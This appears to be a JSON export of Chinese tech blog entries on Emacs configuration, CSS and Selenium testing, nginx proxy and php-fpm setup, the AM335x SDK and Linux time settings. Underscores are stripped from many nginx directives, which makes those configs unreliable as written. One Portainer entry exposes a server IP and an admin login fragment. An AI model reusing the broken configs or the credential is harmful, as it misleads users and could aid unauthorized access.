object。那自然，你得先让这个对象存在于emacs中，然后才能修改。所以要先加载，让需要配置的变量得到定义，再去修改变量的值。\n\n下面，让我们来看看这些脚本文件究竟长什么样子。打开emacs内置插件的文件夹，emacs安装路径\\share\\emacs\\24.4.91\\lisp，你会看到一些子文件夹，一些后缀名为gz的压缩文件，以及一些后缀名为elc的文件。压缩文件中存放的其实是同名的.el文件，也就是前面一直在提的脚本。.elc是这个脚本编译好的版本，可以加快载入速度，不适合人类阅读。所以，如果你想查看一个插件的源代码，请查看.el文件。.el被放在压缩包是为了避免源代码被修改，进而造成各种问题。另外，加载插件时，总是会优先加载编译好的版本，其默认的文件扩展名即.elc；如果不存在，才会加载.el或者其他格式的文件。\nautoload\nautoload 在 emacs 中也是一种类型，和符号、数字、字符串、函数是同等级别的对象，实际上，它就是个函数。它和函数的区别类似于函数原型和函数的区别——没有实际的定义，只有简单说明， 调用的时候才加载相关定义。\n有两种定义方式：\n(autoload 'some-function \"some-file\")\n\nautoload 对象需要用 autoload 函数生成，类似下面这种：(autoload 'fn \"file\" \"docstring\" interactive type)\n参数包含：\n      fn （没有名称你敢怎么调用）\n      file （具体定义实际存储的位置）\n      docstring （使用说明）\n      interactive （如果非 nil 表示可以通过交互方式调用）\n      type （类型：函数、宏、键图）\n\nMagic comments ;;;autoload\n\n把你所有的非emacs自带函数集中起来，放到一个文件夹里；\n然后拆分成许多文件（每个文件里的函数建议不要超过5个），然后函数前面加上 Magic comments** ;;;###autoload ，在你的配置文件里写：\n;假设你的这个文件夹路径为 /x/y/z\n(lazily \"/x/y/z\")\n通俗的说，效果就是，给这些文件里面的函数生成一个路径表，这些函数文件都不用读取了，只读取这个路径表，用到这些函数的时候再根据这个路径表读取所在文件，对于加快 emacs 的启动速度有一定帮助\n\n3.5 Use-package\n默认 不加参数相当于 require\n\n它把各种配置整合到属性里面去\n:commands (isearch-moccur isearch-all) == autoload\n  当包的作者已经不更新时，你可以通过:commands创建自己的autoload引用。推迟到使用他们时在去加载\n:init  == pre-init\n   不管什么情况下,init代码块都会执行,即使use-package调用包不存在，也会执行。并且调用时立即执行。\n:defer t == lazyload\n  使用package本身提供的autoload命令延迟package的加载。实现lazyload 本质上，这就是一个空操作。\n:config == post-init\n  当启用defer后 :init依然会立即执行，但是:config块会延迟到package加载完成之后执行。 因此defer和config盘配合起来使用相当于with-eval-after-load\n\n 使用spacemacs|use-package-add-hook 注入Use-package hooks\n(spacemacs|use-package-add-hook helm\n  :pre-init 注入use-package :init\n  ;; Code\n  :post-init\n  ;; Code\n  :pre-config\n  ;; Code\n  :post-config\n  ;; Code\n  )\n\n当use-package被调用时立即执行:init块代码，因此任何想要将代码注入此块的函数必须在调用use-package之前运行。\n此外，由于对use-package的调用通常发生在init-package函数中，\n而对spacemacs|use-package-add-hook的调用通常发生在pre-init-package函数中，而不在post-init-package 中。\n所以嘛，spacemacs|use-package-add-hook当然最好在pre-init-package中。","tags":null},{"location":"//blog.pytool.com/Reship/2015-03-05-css-test","title":"CSS 测试","text":"预备知识\n\ngrunt\nPhantomJS\nCasperJS\n\n我们要谈的不是TDD，而是一种CSS测试的形式，叫做Visual Regression Testing，使得我们可以从视觉上比较网站正确的版本(baseline)和开发版本(new)。过程很简单，就是给网页进行快照，然后比较像素来寻找区别。\n\n测试工具\n我们将使用PhantomCSS进行测试。它是三个工具的强大结合：\n1.PhantomJS\n2.CasperJS\n3.ResembleJS\n\n同时，我们想把整个过程自动化，所以会把PhantomCSS集成到Grunt。\n\n搭建grunt\n首先引入Anselm的Grunt PhantomCSS 项目到我们的Grunt项目中。因为它还没有NPM命名空间，所以只能直接从github上pull 下来。\n\n    npm i --save-dev git://github.com/anselmh/grunt-phantomcss.git\n\n然后修改Gruntfile.js：\n\n    grunt.loadNpmTasks('grunt-phantomcss');\n\n继续修改Gruntfile.js，对PhantomCSS进行一些配置：\n\n    phantomcss: {\n            options: {\n              mismatchTolerance: 0.05,\n              screenshots: 'baselines',\n              results: 'results',\n              viewportSize: [1280, 800],\n              },\n              src: [\n                 'phantomcss.js'\n              ]\n          },\n\n稍微解释下：\nmisMatchTolerance：\nscreenshots:保存baseline图片的文件夹\nresults:比较结束后，结果会放到这个文件夹\nviewportSize:\nsrc:测试文件的路径，相对于gruntfile\n\n测试文件\n接下来，在我们的测试文件phantomcss.js文件中，就可以使用Casper.js了。PhantomCSS会启动一个PhantomJS浏览器，然后通过Casper.js进行各种导航和所需操作。\n\n示例：\n\n    casper.start('http://localhost:9001/cta-link.html')\n    .then(function() {\n      phantomcss.screenshot('.cta-link', 'cta-link');\n    })\n    .then(function() {\n      this.mouse.move('.cta-button');\n      phantomcss.screenshot('.cta-link', 'cta-link-hover');\n    });\n    \n作比较\n有了baseline的图片后，我们就可以不断地运行测试了。","tags":null},{"location":"//blog.pytool.com/Post/2016-06-01 Linux命令 PHP","title":"Linux命令 PHP","text":"CentOS 7 用户怎样安装 LNMP\nCentOS 7.0安装配置LAMP服务器(Apache+PHP+MariaDB)\nCentOS 7 下安装 LEMP 服务(nginx、MariaDB/MySQL 和 php)\n\nsudo apt install nginx-full\nsudo apt install php\n\nnginx和fastcgi的通信方式有两种，一种是TCP的方式，一种是unix socket方式\nTCP和unix domain socket方式对比\nTCP是使用TCP端口连接127.0.0.1:9000\nSocket是使用unix domain socket连接套接字/dev/shm/php-fpm.sock\n/dev/shm是个tmpfs，速度比磁盘快得多\n################################################################################\n采用unix socket方式\n\n修改php-fpm.conf配置\n  sudo vim /etc/php/7.0/fpm/pool.d/www.conf\n    listen = 127.0.0.1:9000\n    listen=/dev/shm/php7.0-fpm.sock       #/dev/shm/为内存文件系统，注意 确保可读写    \n    listen.owner=nginx                #注意自己的用户和组\n    listen.group=nginx\n\n修改nginx.conf配置\n    user nginx;\n\n    http {\n\n      server {\n    \t    listen       80;\n    \t    servername  localhost;\n\n    \t    location ~ .php$ {\n    \t        root /home/ubuntu/kyserverweixin;\n    \t        tryfiles $uri =404;\n\n    \t      \t#fastcgipass   127.0.0.1:9000;\n    \t        fastcgipass   unix:/dev/shm/php7.0-fpm.sock;\n\n              fastcgiindex  index.php;\n    \t        fastcgiparam  SCRIPTFILENAME  $documentroot$fastcgiscriptname;\n    \t        include        fastcgi_params;\n    \t    }\n\n    \t}\n    }\n\n重启nginx和php-fpm\n\n  nginx -s reload\n  service nginx restart\n  /etc/init.d/nginx start\n\n  /etc/init.d/php7.0-fpm restart\n\n添加测试文件 info.php\n\n    \u003c?php\n    phpinfo();\n  ?  ################################################################################","tags":null},{"location":"//blog.pytool.com/Reship/2015-03-06-selenium-ide","title":"selenium-IDE","text":"简介\n安装\n打开IDE\nIDE功能\n菜单栏\ntest suite 是一套test case。\n\n工具条\ntest case 面板\nlog/reference/ui-element/rollup\n创建Test case\n录制\n需要注意的是：\n\n 要想记录type命令需要在页面某处点击一下\n 点击一个连接通常被录制为click，通常情况下你需要将其变成clickAndWait，这是为了暂停测试用例直到新页面加载完成。否则，测试用例会在页面加载完成之前继续运行，这会导致不可预料的错误。\n\n添加断言和验证\n\n编辑\n运行Test case\n双击某条命令，会单独运行该命令。\n使用Base URL 在不同域名下运行测试用例\nSelenium 命令——\"Selenese\"\n通过Selenese你可以测试标签是否存在，测试指定内容，测试损坏的链接，输入框，下拉列表，提交表单，表格数据。还有窗口大小，鼠标位置，alert，Ajax,弹框，事件处理等等。\n\nselenium命令可以分为三类\n\n Actions。如果一个Action 失败，或者有错误，当前测试用例会失败。\n Accessors。检查应用的状态，并将结果存到变量中。例如：storeTitle\n Assertions。Assertions可以在三种模式下使用：assert,verify和waitFor。例如你可以assertText,verifyText,waitForText.\n\n脚本语法\n常用命令\n\n open\n click/clickAndWait\n verifyTitle/assertTitle\n verifyTextPresent\n verifyElementPresent\n verifyText 验证文本及对应的标签存在于网页中\n verifyTable\n waitForPageToLoad 暂停执行直到新页面加载完。会被clickAndWait自动调用\n waitForElementPresent\n\n验证页面元素\n\nAssertion 还是 Verification\n选择Assert还是verify可以归结为如何方便的管理失败用例。\n\n一个Assert会使当前测试失败并终止当前test case，而一个verify会使当前测试失败但会继续执行当前test case。\n\n最好是以合乎逻辑的顺序分组你的测试命令，每一组以一个assert开始，后面跟着一个或多个verify。\n\nverify TextPresent\nTextPresent命令用来验证指定文本是否在页面中存在。它接受一个参数：要验证的文本。当你只关心文本是否出现时可以用这条命令，但当你关心文本出现的位置时，不要用这条命令。\n\nverifyElementPresent\nverifyElementPresent用来验证指定标签是否在页面中存在。只验证标签，而不是其内容。通常用来检查图片是否存在。\n\nverifyText\nverifyText用来验证标签以及内容是否存在。\n\n定位元素\nlocation strategy 为locatorType=location。locatorType 有好多种，如下：\n根据Identifier定位\n\n这是最常用的也是默认使用的locatorType。根据ID定位时，会返回第一个匹配的元素。如果没有匹配的，那么返回第一个name属性值匹配该id的元素.\n\n示例：\nhtml\n body\n  form id=\"loginForm\"\n   input name=\"username\" type=\"text\" /\n   input name=\"password\" type=\"password\" /\n   input name=\"continue\" type=\"submit\" value=\"Login\" /\n  /form\n /body\nhtml\n\nidentifier=loginForm (3)\nidentifier=password (5)\nidentifier=continue (6)\ncontinue (6)\n由于identifier类型的locator是默认使用的，所以前三个的‘identifier=’不是必须的，可以写成第四个\n\n根据ID定位\nid=loginForm\n根据name定位\n\n html\n  body\n   form id=\"loginForm\"\n    input name=\"username\" type=\"text\" /\n    input name=\"password\" type=\"password\" /\n    input name=\"continue\" type=\"submit\" value=\"Login\" /\n    input name=\"continue\" type=\"button\" value=\"Clear\" /\n   /form\n /body\n html\n\n当有多个元素拥有相同name时，你可以使用过滤器，默认的过滤器是value(匹配value值)\n\nname=username (4)\nname=continue value=Clear (7)\nname=continue Clear (7)\nname=continue type=button (7)\n\n注意：上面提到的三种定位方式都不会涉及到标签层级结构。而xpath和Dom 两种定位方式会涉及到标签的层级\n\n根据Xpath定位\n因为只有xpath locator以'//'开头，所以当使用xpath locator时，不需要xpath=\n\n有用的插件\n\n xpath checker\n firebug\n\n根据链接内容定位超链接\n如果两个链接内容相同，则返回第一个。\nhtml\n body\n  pAre you sure you want to do this?/p\n  a href=\"continue.html\"Continue/a\n  a href=\"cancel.html\"Cancel/a\n/body\nhtml\nlink=Continue (4)\nlink=Cancel (5)\n \n根据DOM定位\n因为只有Dom locator以'document'开始，所以当使用Dom locator时，不需要dom=\n\nhtml\n  body\n   form id=\"loginForm\"\n    input name=\"username\" type=\"text\" /\n    input name=\"password\" type=\"password\" /\n    input name=\"continue\" type=\"submit\" value=\"Login\" /\n    input name=\"continue\" type=\"button\" value=\"Clear\" /\n   /form\n /body\n html\n\ndom=document.getElementById('loginForm') (3)\ndom=document.forms['loginForm'] (3)\ndom=document.forms[0] (3)\ndocument.forms[0].username (4)\ndocument.forms[0].elements['username'] (4)\ndocument.forms[0].elements[0] (4)\ndocument.forms[0].elements[3] (7)\n根据css定位\n大多数selenium用户建议使用css locator，因为它比xpath快。\n\n匹配文本模式\n'AndWait'命令\n需要注意的是：如果你用了一个AndWait命令，而对应的action并没有触发navigation/refresh，你的测试会失败。这是因为当没有任何navigation或refresh的时候，selenium会触发AndWait的timeout，然后抛出一个timeout exception\n在ajax应用中使用waitFor命令\n在ajax应用中，页面不会刷新。使用andWait命令就不起作用了，因为页面没有刷新。通过暂停测试运行一定时间也不是最好的方法，因为响应的时间可长可短，会导致测试失败。最好的方法应该是在一定时间内等待需要的元素，当发现需要的元素时继续执行测试。\n\n这就需要waitFor命令，比如waitForElementPresent或waitForVisible,这些命令每秒检查一次需要的状态，一旦状态满足，就继续执行。\n\n流程控制\nSelenese本身是不支持条件语句和循环语句的。当你需要流程控制的时候，有三种选择：\n\n 列表项\n\n保存命令、selenium变量\nstore是最基本的用来保存值的命令。\n使用的时候用${变量名}\n其它常用store命令\nstoreElementPresent 对应verifyElementPresent。它保存一个布尔值，根据对应的元素是否存在。\nstoreText对应verifyText\nstoreEval 接受一段脚本作为参数。把脚本的运行结果保存到变量里。\n\n","tags":null},{"location":"//blog.pytool.com/Post/nginx/2016-01-01 Linux命令 nginx  proxy_pass反向代理时，cookie丢失的问题 ","title":"Linux命令 Nginx列出目录 autoindex","text":"X-Forwarded-For: 203.0.113.195, 70.41.3.18, 150.172.238.178\n\nlocation / {\n            proxypass   http://192.168.1.12:11080/v1/;\n            proxycookiepath /v1/ /; #关键\n\n            proxysetheader   Host    $host;\n            proxysetheader   RemoteAddr    $remoteaddr;\n            proxysetheader   X-Real-IP    $remoteaddr;\n            proxysetheader   X-Forwarded-For    $proxyaddxforwardedfor;\n        }\n\nlocation / {        \n        proxypass http://127.0.0.1:8090/sso;  \n        proxycookiepath /sso/ /;  \n        proxycookiepath /sso /;  \n}  \n\n如果只是host、端口转换，则cookie不会丢失。例如：\n   location /project {\n       proxypass   http://127.0.0.1:8080/project;\n\n   }\n\n通过浏览器访问http://127.0.0.1/project时，浏览器的cookie内有jsessionid。再次访问时，浏览器会发送当前的cookie。\n\n如果路径也变化了，则需要设置cookie的路径转换，nginx.conf的配置如下\n   location /proxypath {\n       proxypass   http://127.0.0.1:8080/project;\n\n   }\n\n通过浏览器访问http://127.0.0.1/proxypath时，浏览器的cookie内没有jsessionid。再次访问时，后台当然无法获取到cookie了。\n\n详细看了文档：http://nginx.org/en/docs/http/ngxhttpproxymodule.html?\u0026ga=1.161910972.1696054694.1422417685#proxycookiepath\n\n加上路径转换：proxycookiepath  /project /proxypath;\n\n则可以将project的cookie输出到proxypath上。正确的配置是：\n\n   location /proxypath {\n       proxypass   http://127.0.0.1:8080/project;\n       proxycookiepath  /project /proxypath;\n   }\n   # http{\n   #   include    common/proxy.conf;\n   # }\n   # Linux 运维 » Nginx 代理 配置详解\n   proxysetheader field value;\n   更改nginx服务器接收到的客户端请求的请求头信息，然后将心的请求头发送给被代理的服务器\n   field  要更改的信息所在的头域\n   value  更改的值，支持使用文本、变量或者变量的组合\n   默认情况下为以下设置：\n      proxysetheader Host $proxyhost;\n      proxysetheader Connection close;\n\n   proxyrediect\n   用于修改被代理服务器返回的响应头中的location头域和“Rsfresh”头域，与proxypass配合使用，该指令可以把代理服务器返回的地址信息更改为需要的地址信息\n   语法如下三种：\n              (1)proxyredirect redirect replacement;\n                 redirect 匹配location头域值得字符串\n                 replacement 用于替换redirect 变量内容的字符串\n               eg:\n                  假如被代理服务器返回的响应头中“location”头域为：\n                   Location:http://localhost:8081/proxy/some/uri/\n                  设置为：\n                   proxyredirect http://localhost:8081/proxy/ http://mylinuxer/frontend/;\n                  Nginx服务器会将Location头域信息更改为\n                   Location:http://mylinuxer/frintend//some/uri/\n              (2)proxyredirect default;\n               eg:\n                  location块的uri变量作为replacement,并使用proxypass变量作为redirect\n                  location /server/\n                    {\n                       proxypass http://proxyserver/source/;\n                       proxyredirect default;\n                    }\n              (3)proxyredirect off;\n                使用此方法，可将当前作用域下面的所有的proxyredirect指令配置全部设置为无效\n   proxyhideheader field;\n   设置nginx服务器在发送HTTP相应时，隐藏一些头域信息，field为需要隐藏的头域\n   proxypassheader field;\n   设置nginx服务器在发送响应报文时候，报文中不包含\"Date\" \"Server\" \"X-Accel\"等来自被代理服务器的头域信息，field为需要发送的头域.\n   proxypassrequestbody on|off;\n   设置是否将客户端请求的请求体发送给代理服务器，默认设置为开启on\n   proxypassrequestheaders on|off;\n   设置是否将客户端请求的请求头发送给代理服务器，默认设置为开启on\n   proxysetbody value;\n   更改nginx服务器接收到的客户端请求的请求体信息，value为更改的信息\n   proxybind address;\n   如果我们希望代理连接由指定主机处理，可修改此配置，address为IP地址\n   proxyconnecttimeout time;\n   配置nginx服务器与后端被代理服务器尝试建立连接的超时时间，默认为60s\n   proxyreadtimeout time;\n   配置nginx服务器向后端被代理服务器发出read请求后，等待响应的超时时间，默认为60s\n   proxysendtimeout time;\n   配置nginx服务器向后端被代理服务器发出write请求后，等待响应的超时时间，默认为60s\n   proxyhttpversion 1.0|1.1\n   设置nginx服务器提供代理服务的HTTP协议版本，默认为1.0,1.1版本支持upsteam服务器组设置中的keepalive指令\n   proxymethod method;\n   设置Nginx服务器请求被代理服务器时使用的请求方法，method可设置为POST和GET，不加引号，设置了该指令，客户端的请求方法将被忽略\n   proxyignoreclientabort on|off;\n   设置在客户端终端网络请求时，Nginx服务器是否中断对被代理服务器的请求，默认为off中断\n   proxyignoreheaders field ...;\n   设置一些HTTP的响应头中的头域，field为要设置的HTTP响应头的头域，如\"X-Accel-Redirect\"、\"X-Accel-Expires\"、\"Expires\"、\"Cache-Control\"、\"Set-Cookie\"等\n   proxyintercepterrors on|off;\n   配置一个状态是否开启，在开启时，如果被代理的服务器返回的HTTP状态代码为400或者大于400，则nginx服务器使用自己预定义的错误页（使用errorpage指令），如果是关闭状态，则直接将被代理服务器返回的HTTP状态返回给客户端\n   proxyheadershashmaxsize size;\n   配置存放http报文头的哈希表的容量，默认为512个字符，siez为字符大小\n   proxyheadershashbucketsize size;\n   设置nginx服务器申请存放http报文头的哈希表容量的单位大小，默认为64个字符\n   proxynextupstream status ....；\n   可以使用该指令配置在服务器(组)发生哪些异常情况时，将请求顺序交个下一个服务器处理\n   status设置服务器返回状态，可以是一个或多个\n   error 连接错误\n   timeout 超时\n   invalidheader响应头为空或无效\n   http500|http502|http504|http404，被代理服务器返回500 502 504 404状态代码\n   off 无法将请求发送给被代理服务器\n   proxysslsessionreuse on|off;\n   配置是否基于SSL安全协议的会话连接(https://)，默认为开启状态\n\n   ### proxy-global ###\n   #resolver               dns-proxy; # we use \"pdnsd\" here\n   proxyintercepterrors  on; # testing=off\n   proxyignoreclientabort off;\n   proxyredirect          http:// $scheme://;\n\n   ### proxy-header ###\n   proxyhideheader       Server;\n   proxyhideheader       X-Powered-By;\n   proxyhideheader       X-AspNet-Version;\n   proxysetheader        Accept-Encoding   \"\"; # no backend compression\n   proxysetheader        Host              $httphost;\n   proxysetheader        X-Forwarded-By    $serveraddr:$serverport;\n   proxysetheader        X-Forwarded-For   $proxyaddxforwardedfor;\n   proxysetheader        X-Forwarded-Class $classification; # our internal custom header\n   proxysetheader        X-Forwarded-Proto $scheme;\n   map $scheme $msiis      { http off; https on; } # compatibility\n   proxysetheader        Front-End-Https   $msiis;\n\n   ### proxy-timeouts ###\n   proxyconnecttimeout   6;\n   proxysendtimeout      60;\n   proxyreadtimeout      60;\n\n   ### proxy-buffers ###\n   proxybuffering         on;\n   proxybuffersize       8k;\n   proxybuffers           256 8k;\n   proxybusybufferssize    64k;\n   proxytempfilewritesize 64k;\n   proxytemppath         /var/spool/nginx/temp/;\n\n   2  Proxy Buffer详解\n   proxy buffer启用以后，nginx服务器会异步地将被failing服务器的响应数据传递给客户端，首先，nginx服务器会尽可能的从被代理服务器哪里接收响应数据，放在Proxy Buffer中\n   2.1\n   proxybuffering on|off;\n   配置是否开启或关闭proxy buffer功能,默认为开启\n\n   2.2\n   proxybuffers number size;\n   设置接收一次被代理服务器响应数据的proxy buffer个数和每个buffer的大小\n   number 为个数\n   size 为大小\n   默认设置为\n   proxybuffers 8 4k|8k;\n\n   proxybuffersize size;\n   配置从被代理服务器获取的第一部分响应数据的大小\n   size 设置缓存的大小，保持与proxybuffers设置的size相同\n   proxybusybufferssize size;\n   限制同时处于BUSY状态的缓存区总大小，默认为8KB故意整个16KB\n   proxytemppath path .........;\n   配置磁盘上的一个文件路径，用于零食存放服务器的大体积响应数据\n   path 设置存放临时文件的路径\n   ..... 目录\n   eg :\n       proxytemppath /nginx/proxyweb/proxytemp 1 2;\n       临时文件存放目录为/nginx/proxyweb/proxytemp路径下的第二级目录中\n\n   proxymaxtempfilesize size;\n   配置所有临时文件的总体积的大小，存放在磁盘上的临时文件大小不能超过该值\n   size设置大小，默认我1024MB\n\n   proxytempfilewritesize size;\n   配置同时写入临时文件的数据量的总大小，可以设置为8KB 16KB,一般与平台的内存页大小相同\n\n   3.Proxy Cache配置详解\n   Proxy Cache机制依赖于Proxy Buffer机制，只有当后者开启的时候，前者才能使用\n   proxycache zone | off;\n   配置一块用于公用的内存区域名称，该区域可以存放缓存的索引数据\n   zone 设置用于存放缓存索引的内存区域的名称\n   off  关闭proxycache功能，默认为关闭的\n\n   proxycachebypass string..........；\n   配置nginx服务器向客户端发送响应数据时，不从缓存中获取的条件\n   string 为条件变量\n   eg:\n     proxycachebypass $cookienocache;\n\n   proxycachekey string;\n   配置nginx服务器在内存中为缓存数据建立索引时使用的关键字\n   string 为设置的关键字\n   通常使用以下配置\n    eg :\n       proxycachekey \"$scheme$proxyhost$uri$isargs$args\";\n\n   proxycachelock on|off;\n   设置是否开启缓存锁的功能，默认为关闭状态\n   proxycachelocktimeout time;\n   设置缓存锁功能开启以后锁的超时时间，默认为5\n   proxycacheminuses number;\n   设置客户请求发送的次数，当客户端向被代理服务器发送相同请求到达一定的次数后，nginx才对请求进行缓存，默认为1\n   proxycachepath path [levels=levels] keyszone=name:size [inactive=time] [maxsize=size2] [loaderfiles=number] [loadersleep=time2] [loaderthreshold=time3];\n   设置nginx服务器存储数据的路径以及和缓存索引相关的内容\n   path 设置缓存数据存放的根路径，此路径必须存在\n   levels 设置相对于path指定目录的第几级hash目录中缓存数据\n   name:size1 用于设置存放缓存索引的内存区域的名称和大小\n   time1 设置强制更新缓存数据的时间默认为10s\n   size2 设置硬盘中缓存数据的大小限制\n   number 设置缓存索引重建进程每次加载的数据袁术的数量上限，默认为100\n   time2 设置缓存索引重建进程在一次遍历结束，下一次遍历开始之间的暂停时间，默认为50ms\n   time3 设置遍历一次磁盘缓存源数据的时间上限，默认为200ms\n   eg:\n      proxycachepath /home/cache levels=1:2 keyszone=cacheone:200m inactive=1d maxsize=30g;\n\n   proxycacheusestale error|timeout|invalidheader|updating|http500|http502|http503|http504|http404 | off .....;\n   设置nginx在访问被代理服务器过程中出现被代理服务器无法访问或者访问错误等现象时，nginx服务器可以使用历史缓存响应客户端，该指令默认为off\n\n   proxycachevalid [ code ....] time;\n   设置对不同的HTTP响应状态设置不同的缓存时间\n   code 设置响应状态，nginx 职位http状态代码为200 301  302做缓存，可以使用any表示所有该指令中为设置的其他响应数据\n   time 设置缓存时间\n   eg:\n      proxycachevalid 200 302 1h;\n      proxycachevalid 301 1h;\n      proxycachevalid any 1m;\n\n   proxynocache string;\n   设置什么情况下不使用cache\n`","tags":null},{"location":"//blog.pytool.com/Hardware/Android 底层/2016-01-07 Linux嵌入式 AM335x开发","title":"嵌入式开发 AM335x","text":"TI Resource Explorer\nPROCESSOR-SDK-LINUX-AM335X\nAM335x(TQ335x)移植笔记\n为AM335x移植Linux内核主线代码\nTI am335x sdk安装过程记录\n\n第一部分 sdk的组成\nbeaglebone black出厂是带的debian的系统, 除此之外TI还提供了一个sdk, 这个sdk由以下几部分组成\n预编译好的 SPL /uboot /kernel /dtb的镜像, 在 sdk/baordsupport/prebuilt-images 下: 其中 uboot-spl.bin-am335x-evm 是板子的初始化程序, 这个程序运行之后可以引导uboot(u-boot-am335x-evm.img) , uboot运行起来之后可以引导内核(zImage-am335x-evm.bin) ,新版的内核首先使用dts来给内核提供设备信息, 而不是原来的TAGS方式. 这个dts编译之后是dtb文件(am335x-boneblack.dtb). 有了这些文件我们就可以重新烧写整个系统了. 在以后的开发过程中如果想切换回最开始的系统只需要找个sd卡将这些文件烧写到sd卡中, 从sd卡启动就好了.\nuboot / kernel 的源码: sdk/board-support / u-boot-2014.07-g7e537bf 和 sdk /board-support / linux-3.14.26-g2489c02, 有这些源码就可以开始开发工作了\n完整的交叉编译链: sdk /linux-devkit/sysroots/i686-arago-linux/usr/bin , 将这个路径添加到环境变量中就可以使用了. 添加方法: 打开 /etc/environment 把这个路径添加到末尾, 执行source /etc/environment 就可以使用了\n第二部分 sdk的安装\n首先到TI下载sdk,\n[plain] view plain copy\nsudo ./ti-processor-sdk-linux-am335x-evm-01.00.00.00-Linux-x86-Install.bin  \n然后是图形界面选择安装路径\n\n在sdk目录下TI提供了一个脚本, 执行这个脚本就会帮忙做好以下几件事情(执行之前要保证系统已经可以联网了)安装完成之后进入sdk目录执行:\n[plain] view plain copy\nsudo ./setup.sh  \n建立tftp环境,  创建/tftpboot目录作为tftp的目录, 并且脚本会自动把需要的镜像放到这个目录下边\n建立nfs环境, 创建sdk/targetNFS为nfs目录, 文件系统也已经复制到这个文件夹下边\n\n接下来就可以开始编译uboot和内核了, 而顶层的Makefile已经帮我们弄好了我们只需要执行一条指令就可以将这两者编译完成:\n[plain] view plain copy\nsudo make ARCH=arm all  \n\n然后就开始了漫长的编译过程...\n\n基本上只需要执行这两个命令,一切都已经弄好了, 只需要你自己将交叉编译链的目录添加到环境变量里即可.\n\n第三部分 linux下烧写sd卡","tags":null},{"location":"//blog.pytool.com/Post/docker/2016-10-04 Portainer","title":"Portainer","text":"Portainer\n\nhttp://114.215.45.96:9000\nadmin:por...","tags":null},{"location":"//blog.pytool.com/Linux/2016-01-01 Linux时区设置","title":"Linux 时区设置","text":"---\nhttps://segmentfault.com/a/1190000005026503\n\nlinux 如何计算系统显示时间\n  硬件时间 就是主板上BIOS的RTC时间\n  设置时区 [UTC] 就是伦敦时间 [PRC]是Asia/Shanghai别名 北京时间 可以通过tzselect进行设置\n  ** 计算机上显示时间 locatetime\n Linux系统上显示的time总是通过系统上的timezone设置的\n 如何保证windows和linux时间同步？\n  设置显示时间为\n  timedatectl set-local-rtc 1 --adjust-system-clock\n  硬件时间[RTC]为本地时间\n  hwclock --systohc --localtime  # 将LOCAL时间存入RTC\n\n设置时区\n设置硬件[RTC]时间为(UTC)\ntimedatectl set-local-rtc 0 --adjust-system-clock   设置硬件时间为(UTC)\n  ##等效命令\n  hwclock --systohc --utc        # 将UTC时间存入RTC\n  hwclock --systohc --localtime  # 将LOCAL时间存入RTC\n\n设置 timezone /etc/timezone\necho \"Asia/Shanghai\"   /etc/timezone\ntimedatectl set-timezone UTC\ntimedatectl set-timezone PRC\ntimedatectl set-timezone Asia/Shanghai\n\n设置本地时间localtime /etc/localtime\n\nsudo dpkg-reconfigure -f noninteractive tzdata\n等价 sudo DEBIAN_FRONTEND=noninteractive dpkg-reconfigure tzdata\n等价 ln -snf /usr/share/zoneinfo/$TZ /etc/localtime\n\ntimedatectl list-timezones\ntimedatectl set-timezone “Asia/Kolkata”\ntimedatectl set-local-rtc 0\ntimedatectl set-ntp true\n##########################################################################\n最近在搞RTC，常用的两个命令式 date 和 hwclock。\n\ndate命令：操作内核时间（可以理解为软件时间）\n\n    #date -s 20110120        //设置本地日期为 2011年01月20号，这样会把具体时间设置成空00:00:00\n    #date -s 12:23:23        //设置本地时间，不会对日期做更改\n    #date -s \"12:12:23 2011-01-20\"   //设置日期和具体时间\n\nhwclock命令：操作硬件RTC芯片时间（可以理解为硬件时间）\n\n    hwclock -r or hwclock --show           显示硬件时钟与日期\n    hwclock -s or hwclock --hctosys        将系统时钟调整为与目前的硬件时钟一致。\n    hwclock -w or hwclock --systohc        将硬件时钟调整为与目前的系统时钟一致。\n\n    功能说明：显示与设定硬件时钟。\n        语法：hwclock --adjust--directisa--show[--test]\n    --utc[--set --date=日期与时间]\n\n        补充说明：在Linux中有硬件时钟与系统时钟等两种时钟。硬件时钟是指主机板上的时钟设备，也就是通常可在BIOS画面设定的时钟。系统时钟则是指 kernel中的时钟。当Linux启动时，系统时钟会去读取硬件时钟的设定，之后系统时钟即独立运作。所有Linux相关指令与函数都是读取系统时钟的设定。\n\n        参数：\n        --adjust 　hwclock每次更改硬件时钟时，都会记录在/etc/adjtime文件中。使用--adjust参数，可使hwclock根据先前的记录来估算硬件时钟的偏差，并用来校正目前的硬件时钟。\n        --debug 　显示hwclock执行时详细的信息。\n        --directisa hwclock预设从/dev/rtc设备来存取硬件时钟。若无法存取时，可用此参数直接以I/O指令来存取硬件时钟。\n        --hctosys   将系统时钟调整为与目前的硬件时钟一致。\n        --set --date=日期与时间 　设定硬件时钟。\n        --show      显示硬件时钟的时间与日期。\n        --systohc   将硬件时钟调整为与目前的系统时钟一致。\n        --test      仅测试程序，而不会实际更改硬件时钟。\n        --utc       若要使用格林威治时间，请加入此参数，hwclock会执行转换的工作。\n        --version   显示版本信息","tags":null},{"location":"//blog.pytool.com/Post/敏捷开发/自动化/2016-10-04 Huginn","title":"Huginn","text":"建立你自己的IFTTT\n\nHuginn 是雅虎开发的一个系统，可以帮你执行自动化的在线任务。可以阅读网页,关注事件,并采取相应操作。Huginn 通过一个直观的事件流图来展示各种操作和事件。通过在你自己的服务器上的管道加上IFTTT，你就能知道你的数据，以及你做了什么。","tags":null},{"location":"//blog.pytool.com/Edit/2015-11-09 文本编辑emacs-notes","title":"Emacs笔记","text":"1. 关于Emacs \n\nEMacs 是一个 Lisp 解释器，是 Elisp Macros 的缩写。用 /高德纳/ 的话讲，用\nEMacs 按键就像弹琴。没错，使用Emacs，你经常需要按 Esc + Meta + Alt +\nControl + Shift，所以叫 Emacs 。\n\n一些约定：\n\nC-x 表示同时按住Ctrl和x，M-x 表示先按Esc再按x，或者按住Alt的时候按x。\nC-x v l表示同时按住Ctrl和x后，松开Ctrl再依次按v和l。\nC-x C-f表示按住Ctrl同是分别按x和f。\n键序列是大小写敏感的。如果你的键序列输入一半，你又改变了注意，可以按\n  C-g 或者 Esc Esc Esc，取消键入的命令。\n\nGood reference \n\nEmacsWiki\nCmdMarkdown\nsacha chua, an awsome girl\n\n2. 启动Emacs时的选项 \n\n-nw 在终端下启动emacs，不使用gui。\n-q 不读取 =.emacs= 。\n-Q 不仅不读取 =.emacs= ，也略过 site-lisp 。\n\n3. 用户界面 \n\n如果你在终端使用Emacs, 用 (M-) 或者 (ESC, ) 可以方便的使用菜单.\n在图形界面下同样可以试试啊.\n\n状态栏上的标记：（把鼠标放在状态栏上在 MiniBuffer 上会出现说明）\n  -- 